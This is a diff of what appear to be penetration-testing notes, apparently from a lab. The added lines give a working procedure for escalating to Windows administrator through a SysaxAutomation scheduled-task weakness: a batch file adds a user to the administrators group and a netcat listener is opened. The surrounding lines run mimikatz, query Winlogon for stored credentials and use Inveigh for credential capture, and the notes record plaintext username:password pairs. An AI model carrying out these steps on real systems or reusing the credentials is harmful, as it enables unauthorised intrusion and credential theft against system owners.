@@ -92,8 +92,30 @@ type unattend.xml
 ```
 - ilfserveradm:Sys26Admin
 
-SysaxAutomation vulnerability (searchsploit 50894)
-Elevate to system
+## Elevate to system
+SysaxAutomation vulnerability (searchsploit 50834)
+```
+1. Create folder c:\temp
+2. Download netcat (nc.exe) to c:\temp
+3. Create file 'pwn.bat' in c:\temp with contents
+	net localgroup administrators ilfserveradm /add
+4. Open command prompt and netcat listener
+	nc -nlvvp 1337
+5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
+6. Select Setup Scheduled/Triggered Tasks
+	- Add task (Triggered)
+	- Update folder to monitor to be c:\temp
+	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
+	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
+	- Uncheck 'Login as the following user to run task'
+	- Finish and Save
+7. Create new text file in c:\temp
+8. Check netcat listener
+```
+```
+gpupdate
+net localgroup administrators
+```
 
 ```
 mimikatz.exe
@@ -107,6 +129,9 @@ Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 
 
 https://github.com/Kevin-Robertson/Inveigh
+- Run as administrator
 ```
+Import-Module .\Inveigh.ps1
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
 ```
+- mpalledorous:1squints2
